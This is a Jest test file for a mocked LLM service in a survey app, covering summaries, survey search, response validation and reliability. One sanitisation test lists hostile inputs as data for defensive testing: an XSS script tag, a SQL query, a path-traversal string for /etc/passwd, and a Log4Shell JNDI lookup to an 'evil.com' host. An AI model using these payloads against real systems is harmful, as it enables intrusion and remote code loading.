const llmService = require('../../services/llmService');
const { cleanupTestData } = require('../utils/testHelpers');

// Mock the LLM service to use our test mock
jest.mock('../../services/llmService', () => require('../mocks/llmService.mock'));

describe('LLM Service Integration Tests', () => {
  beforeEach(async () => {
    await cleanupTestData(['users', 'surveys']);
    
    // Ensure mock environment
    process.env.USE_MOCK_LLM = 'true';
  });

  describe('Environment Configuration', () => {
    it('should use mock LLM service in test environment', () => {
      expect(process.env.USE_MOCK_LLM).toBe('true');
      expect(process.env.NODE_ENV).toBe('test');
    });

    it('should not make real API calls in test environment', async () => {
      // This test ensures we never accidentally call real LLM APIs
      const originalFetch = global.fetch;
      const originalAxios = require('axios');
      
      // Mock axios to throw if any real HTTP request is made
      const mockAxios = {
        ...originalAxios,
        post: jest.fn().mockImplementation(() => {
          throw new Error('Real HTTP request attempted in test environment');
        }),
        get: jest.fn().mockImplementation(() => {
          throw new Error('Real HTTP request attempted in test environment');
        })
      };

      // Replace axios temporarily
      jest.doMock('axios', () => mockAxios);

      try {
        // Any LLM operation should work without making HTTP requests
        const result = await llmService.generateSummary(
          'Test responses',
          'Test guidelines',
          'Test question',
          'Test area'
        );
        
        expect(result).toBeDefined();
        expect(result.summary).toBeDefined();
        
        // Verify no real HTTP requests were made
        expect(mockAxios.post).not.toHaveBeenCalled();
        expect(mockAxios.get).not.toHaveBeenCalled();
      } finally {
        // Restore original axios
        jest.dontMock('axios');
      }
    });
  });

  describe('Summary Generation', () => {
    it('should generate summary from survey responses', async () => {
      const responseTexts = [
        'Great product, very satisfied',
        'Good value for money',
        'Could improve customer service',
        'Excellent quality and fast delivery'
      ].join('\n');

      const summary = await llmService.generateSummary(
        responseTexts,
        'Provide constructive feedback summary',
        'How satisfied are you with our product?',
        'Customer Satisfaction'
      );

      expect(summary).toBeDefined();
      expect(summary.summary).toBe('Mock AI-generated summary of the survey responses.');
      expect(summary.keyThemes).toEqual(['Positive feedback', 'Areas for improvement', 'Suggestions']);
      expect(summary.sentiment).toBe('neutral');
      expect(summary.confidence).toBe(0.85);
    });

    it('should handle empty response content', async () => {
      try {
        await llmService.generateSummary('', 'Guidelines', 'Question', 'Area');
        // Should not reach here if validation is implemented
      } catch (error) {
        expect(error.message).toInclude('empty');
      }
    });

    it('should handle error responses from mock', async () => {
      try {
        await llmService.generateSummary(
          'error test content',
          'Guidelines',
          'Question',
          'Area'
        );
        expect.fail('Should have thrown an error');
      } catch (error) {
        expect(error.message).toContain('Mock error during summary generation');
      }
    });
  });

  describe('Survey Search', () => {
    it('should search surveys using natural language', async () => {
      const surveysContext = [
        {
          id: 'survey1',
          title: 'Customer Satisfaction Survey',
          description: 'Feedback about our products',
          area: 'Technology'
        },
        {
          id: 'survey2',
          title: 'Employee Engagement Survey',
          description: 'Internal feedback about workplace',
          area: 'HR'
        },
        {
          id: 'survey3',
          title: 'Product Quality Assessment',
          description: 'Quality evaluation of our latest products',
          area: 'Technology'
        }
      ];

      const searchResults = await llmService.searchSurveys(
        'technology product feedback',
        surveysContext
      );

      expect(searchResults).toBeDefined();
      expect(searchResults).toBeInstanceOf(Array);
      expect(searchResults.length).toBeLessThanOrEqual(3);
      
      searchResults.forEach(result => {
        expect(result).toHaveProperty('surveyId');
        expect(result).toHaveProperty('relevanceScore');
        expect(result).toHaveProperty('reason');
        expect(result.relevanceScore).toBeGreaterThanOrEqual(0);
        expect(result.relevanceScore).toBeLessThanOrEqual(1);
      });
    });

    it('should handle search with no matching surveys', async () => {
      const searchResults = await llmService.searchSurveys(
        'completely unrelated query',
        []
      );

      expect(searchResults).toBeDefined();
      expect(searchResults).toBeInstanceOf(Array);
      expect(searchResults.length).toBe(0);
    });

    it('should handle search errors gracefully', async () => {
      try {
        await llmService.searchSurveys(
          'error test search query',
          [{ id: 'survey1', title: 'Test' }]
        );
        expect.fail('Should have thrown an error');
      } catch (error) {
        expect(error.message).toContain('Mock error during survey search');
      }
    });
  });

  describe('Response Validation', () => {
    it('should validate survey responses', async () => {
      const responses = [
        {
          id: 'response1',
          content: 'This is a valid response with constructive feedback',
          user: 'user1'
        },
        {
          id: 'response2',
          content: 'Another valid response about the survey topic',
          user: 'user2'
        },
        {
          id: 'response3',
          content: 'This response contains invalid inappropriate content',
          user: 'user3'
        }
      ];

      const validationResults = await llmService.validateResponses(
        responses,
        'Responses should be constructive and relevant'
      );

      expect(validationResults).toBeDefined();
      expect(validationResults).toBeInstanceOf(Array);
      expect(validationResults.length).toBe(responses.length);

      validationResults.forEach(result => {
        expect(result).toHaveProperty('responseId');
        expect(result).toHaveProperty('isValid');
        expect(result).toHaveProperty('feedback');
        expect(result).toHaveProperty('suggestions');
        
        expect(typeof result.isValid).toBe('boolean');
        expect(typeof result.feedback).toBe('string');
        expect(result.suggestions).toBeInstanceOf(Array);
      });

      // Check specific validation results
      const invalidResponse = validationResults.find(r => 
        r.responseId === 'response3' || !r.isValid
      );
      if (invalidResponse) {
        expect(invalidResponse.isValid).toBe(false);
        expect(invalidResponse.suggestions.length).toBeGreaterThan(0);
      }
    });

    it('should handle empty responses array', async () => {
      const validationResults = await llmService.validateResponses(
        [],
        'Guidelines'
      );

      expect(validationResults).toBeDefined();
      expect(validationResults).toBeInstanceOf(Array);
      expect(validationResults.length).toBe(0);
    });

    it('should provide helpful suggestions for invalid responses', async () => {
      const responses = [
        {
          id: 'response1',
          content: 'This response has invalid content that needs improvement',
          user: 'user1'
        }
      ];

      const validationResults = await llmService.validateResponses(
        responses,
        'Responses should be professional and constructive'
      );

      const result = validationResults[0];
      if (!result.isValid) {
        expect(result.suggestions.length).toBeGreaterThan(0);
        expect(result.suggestions[0]).toContain('Please provide more constructive feedback');
      }
    });
  });

  describe('Service Reliability', () => {
    it('should handle concurrent LLM operations', async () => {
      const operations = [
        llmService.generateSummary('Test content 1', 'Guidelines', 'Q1', 'Area1'),
        llmService.generateSummary('Test content 2', 'Guidelines', 'Q2', 'Area2'),
        llmService.searchSurveys('test query', [{ id: 'survey1', title: 'Test' }]),
        llmService.validateResponses([{ id: 'r1', content: 'Valid content' }], 'Guidelines')
      ];

      const results = await Promise.all(operations);

      expect(results).toHaveLength(4);
      results.forEach(result => {
        expect(result).toBeDefined();
      });
    });

    it('should maintain consistent response format', async () => {
      const summary = await llmService.generateSummary(
        'Test content',
        'Guidelines',
        'Question',
        'Area'
      );

      const search = await llmService.searchSurveys(
        'test query',
        [{ id: 'survey1', title: 'Test Survey' }]
      );

      const validation = await llmService.validateResponses(
        [{ id: 'response1', content: 'Test response' }],
        'Guidelines'
      );

      // Summary should have expected structure
      expect(summary).toHaveProperty('summary');
      expect(summary).toHaveProperty('keyThemes');
      expect(summary).toHaveProperty('sentiment');
      expect(summary).toHaveProperty('confidence');

      // Search should return array with specific structure
      expect(search).toBeInstanceOf(Array);
      if (search.length > 0) {
        expect(search[0]).toHaveProperty('surveyId');
        expect(search[0]).toHaveProperty('relevanceScore');
        expect(search[0]).toHaveProperty('reason');
      }

      // Validation should return array with specific structure
      expect(validation).toBeInstanceOf(Array);
      if (validation.length > 0) {
        expect(validation[0]).toHaveProperty('responseId');
        expect(validation[0]).toHaveProperty('isValid');
        expect(validation[0]).toHaveProperty('feedback');
        expect(validation[0]).toHaveProperty('suggestions');
      }
    });

    it('should handle rate limiting gracefully', async () => {
      // Test multiple rapid requests
      const rapidRequests = Array(10).fill().map((_, index) =>
        llmService.generateSummary(
          `Test content ${index}`,
          'Guidelines',
          'Question',
          'Area'
        )
      );

      const startTime = Date.now();
      const results = await Promise.all(rapidRequests);
      const endTime = Date.now();

      // All requests should complete
      expect(results).toHaveLength(10);
      results.forEach(result => {
        expect(result).toBeDefined();
        expect(result.summary).toBeDefined();
      });

      // Should complete in reasonable time (mocked responses are fast)
      expect(endTime - startTime).toBeLessThan(5000);
    });

    it('should handle network timeouts gracefully', async () => {
      // This test simulates what should happen with network issues
      // In a real implementation, you'd test actual timeout handling
      
      const result = await llmService.generateSummary(
        'Test content with simulated delay',
        'Guidelines',
        'Question',
        'Area'
      );

      expect(result).toBeDefined();
      expect(result.summary).toBeDefined();
    });
  });

  describe('Data Sanitization', () => {
    it('should handle malicious input safely', async () => {
      const maliciousContent = [
        '<script>alert("xss")</script>',
        'SELECT * FROM users;',
        '../../etc/passwd',
        'javascript:alert(1)',
        '${jndi:ldap://evil.com/a}'
      ].join('\n');

      // Should not crash or execute malicious code
      const result = await llmService.generateSummary(
        maliciousContent,
        'Clean guidelines',
        'Safe question',
        'Safe area'
      );

      expect(result).toBeDefined();
      expect(result.summary).toBeDefined();
      
      // Result should not contain the malicious content
      expect(result.summary).not.toContain('<script>');
      expect(result.summary).not.toContain('SELECT');
    });

    it('should handle extremely long input', async () => {
      const longContent = 'A'.repeat(10000); // 10KB of text

      const result = await llmService.generateSummary(
        longContent,
        'Guidelines',
        'Question',
        'Area'
      );

      expect(result).toBeDefined();
      expect(result.summary).toBeDefined();
    });

    it('should handle special characters properly', async () => {
      const specialContent = 'Test with émojis 🚀 and spéciál chàractérs ñ ü';

      const result = await llmService.generateSummary(
        specialContent,
        'Guidelines',
        'Question',
        'Area'
      );

      expect(result).toBeDefined();
      expect(result.summary).toBeDefined();
    });
  });

  describe('Mock Service Verification', () => {
    it('should verify mock functions are working correctly', () => {
      expect(llmService.useMockLLM).toBe(true);
      expect(typeof llmService.generateSummary).toBe('function');
      expect(typeof llmService.searchSurveys).toBe('function');
      expect(typeof llmService.validateResponses).toBe('function');
      expect(typeof llmService.loadPrompts).toBe('function');
      expect(typeof llmService.getPrompt).toBe('function');
    });

    it('should return consistent mock responses', async () => {
      const result1 = await llmService.generateSummary('Test', 'G', 'Q', 'A');
      const result2 = await llmService.generateSummary('Test', 'G', 'Q', 'A');

      // Mock should return consistent structure
      expect(result1.summary).toBe(result2.summary);
      expect(result1.keyThemes).toEqual(result2.keyThemes);
      expect(result1.sentiment).toBe(result2.sentiment);
      expect(result1.confidence).toBe(result2.confidence);
    });

    it('should handle prompt loading in test environment', async () => {
      // loadPrompts should work without errors in test environment
      await expect(llmService.loadPrompts()).resolves.not.toThrow();
      
      // getPrompt should return mock prompt
      const prompt = llmService.getPrompt('testPrompt', { variable: 'value' });
      expect(prompt).toContain('testPrompt');
      expect(prompt).toContain('variable');
    });
  });
}); 